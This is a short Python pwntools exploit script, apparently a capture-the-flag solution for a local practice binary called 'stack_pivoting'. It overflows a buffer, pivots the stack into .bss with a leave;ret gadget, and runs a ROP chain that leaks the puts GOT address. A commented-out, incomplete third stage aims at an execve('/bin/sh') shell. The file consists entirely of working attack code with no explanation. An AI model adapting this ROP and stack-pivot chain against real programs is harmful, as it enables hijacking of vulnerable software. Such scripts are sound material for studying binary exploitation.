#!/usr/bin/env python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")
elf = ELF('./stack_pivoting')
r = process('./stack_pivoting')
gdb.attach(r)

start = 0x0000000000401090
padding = b'a' * 0x40
bss = 0x404400
read_addr = 0x0000000000401203
pop_rdi_ret = 0x00000000004011e3
ret = 0x000000000040101a
leave_ret = 0x000000000040121f

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]

'''
Step 1
'''
r.recvuntil(b"Do you know Stack_Pivoting?\n")
rop = p64(bss) + p64(read_addr)
r.send(padding + rop)  # len = 0x48 + 0x3

'''
Step 2
'''
rop2 = p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start)
rop2 = rop2.ljust(0x40, b"\x00")
rop2 = rop2 + p64(bss - 0x40) + p64(leave_ret)
r.send(rop2)
#
# '''
# Stage 3
# '''
# rop3 = b'/bin/sh\x00' + p64(pop_rdi_ret) + p64(bss_buf + 0x20) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(
#     0) + p64(pop_rax_ret) + b"A" * 0x3b + p64(syscall)
#
# r.sendline(rop3)

r.interactive()
